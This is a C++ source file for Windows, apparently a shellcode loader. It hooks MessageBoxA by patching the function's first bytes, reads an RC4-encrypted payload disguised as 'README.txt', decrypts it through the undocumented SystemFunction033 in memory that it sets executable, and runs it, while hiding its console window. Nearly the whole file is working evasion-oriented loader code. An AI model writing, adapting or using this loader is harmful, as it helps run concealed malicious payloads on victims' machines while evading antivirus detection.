#include<iostream>
#include<bits/stdc++.h>
#include<Windows.h>
#include"test.h"

using namespace std;
#pragma warning (disable:4996)
FARPROC oldAddress = NULL;
SIZE_T bytesWritten = 0;
char messageBoxOriginalBytes[13] = {};
int __stdcall Hookedshell(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);


typedef NTSTATUS(WINAPI* _SystemFunction033)(
	struct ustring* memoryRegion,
	struct ustring* keyPointer);

struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;

void setHook() {
	SIZE_T bytesRead = 0;
	ReadProcessMemory(GetCurrentProcess(), oldAddress, messageBoxOriginalBytes, 13, &bytesRead);

	void* hookedAddress = Hookedshell;
	char patch[13] = { 0x49, 0xBC, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0x54, 0xC3 };
	memcpy_s(patch + 2, 8, &hookedAddress, 8);

	WriteProcessMemory(GetCurrentProcess(), (LPVOID)oldAddress, patch, sizeof(patch), &bytesWritten);
}


int __stdcall Hookedshell(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
{
	DWORD   old_protect = 0;
	unsigned char* payload;
	int payload_len = 0;

	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
	char _key[] = "www.osandamalith.com";


	//note!
	//you should replace the inputfile with your own decoded file
	payload = inputFile("README.txt", payload_len);

	// allocate memory buffer for payload as READ-WRITE (no executable)
	void* runtime = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!runtime) {
		printf("Memory allocation failed\n");
		return -1;
	}
	// copy payload to the buffer
	RtlMoveMemory(runtime, payload, payload_len);

	VirtualProtect(runtime, payload_len, PAGE_EXECUTE_READWRITE, &old_protect);

	key.Buffer = (PUCHAR)(&_key);
	key.Length = sizeof key;

	_data.Buffer = (PUCHAR)runtime;
	_data.Length = sizeof runtime;

	SystemFunction033(&_data, &key);
	
	((int (*)())runtime)();

	VirtualFree(runtime, payload_len, MEM_RELEASE);
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)oldAddress, messageBoxOriginalBytes, sizeof(messageBoxOriginalBytes), &bytesWritten);

	int r = MessageBoxA(NULL, lpText, lpCaption, uType);

	setHook();
	return r;
}


// a small test using RC4 crypt
//int main()
//{
//	unsigned char S_box[256] = { 0 };
//	unsigned char Key[] = { "e8d8fnehdu3h9jw0djh2eop40xy63b9dsacfe35gjx" };
//	unsigned char Data[] = { "flag{confidenttial data}" };
//	int i;
//
//	RC4_Init(S_box, Key, strlen((char*)Key));
//	printf("S-box：\n");
//	for (i = 0; i < 256; ++i) {
//		printf("%02x", S_box[i]);
//		if ((i + 1) % 16 == 0) printf("\n");
//	}
//
//	RC4_Crypt(S_box, Data, strlen((char*)Data));
//
//
//	RC4_DeCrpty(S_box, Key, Data);
//
//
//	system("PAUSE");
//	return 0;
//}

int main()
{
	FreeConsole();
	HINSTANCE library = LoadLibraryA("user32.dll");

	// 获取在内存中MessageBox函数的地址
	oldAddress = GetProcAddress(library, "MessageBoxA");

	/*
	* 创建挂钩:
	*/
	setHook();

	MessageBoxA(NULL, "hi", "hi", MB_OK);

	return 0;
}

